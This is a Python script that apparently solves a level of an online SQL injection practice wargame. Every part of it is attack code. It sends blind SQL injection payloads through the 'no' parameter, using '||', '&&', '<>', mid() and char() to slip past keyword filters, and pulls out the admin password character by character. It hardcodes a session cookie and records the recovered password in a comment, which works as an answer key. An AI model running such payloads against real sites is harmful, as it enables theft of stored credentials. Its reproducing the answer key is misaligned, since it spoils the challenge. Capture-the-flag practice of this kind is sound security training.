import requests

url = "http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

headers = {
    "Cookie": "PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
}

pw_length=0
pw=""

# Find Admin PW Length
for i in range(1,20):

    params = {
        "pw":1,
        "no":"3||no<>1&&length(pw)<>%d" % i

    }
    print "[Try %d]" % i
    res = requests.get(url, headers=headers, params=params)
    if "Hello admin" not in res.content:
        print "Found It! 'Admin' PW Length : %d" % i
        pw_length = i
        break


# Find Admin pw
# Admin Pw: 52dc3991
for i in range(1,(pw_length)+1):
    for j in range(0x20, 0x7f):
        if '#' == chr(j) or '\'' == chr(j) or '\"' == chr(j) or '!' == chr(j) or '%' == chr(j) or ' ' == chr(j) or '_' == chr(j) or '.' == chr(j) or '(' == chr(j) or ')' == chr(j):
            continue
        params = {
            "pw":1,
            "no":"3||no<>1&&mid(pw,%d,1)<>char(%d)" % (i, j)
        }
        print "[Try Find PW index:%d, chr:%c]" % (i, chr(j))
        res = requests.get(url, headers=headers, params=params)
        if "Hello admin" not in res.content:
            print "Found It PW"
            pw += chr(j)
            print pw
            break

print "PW!!!! ->>>>", pw.lower()



 


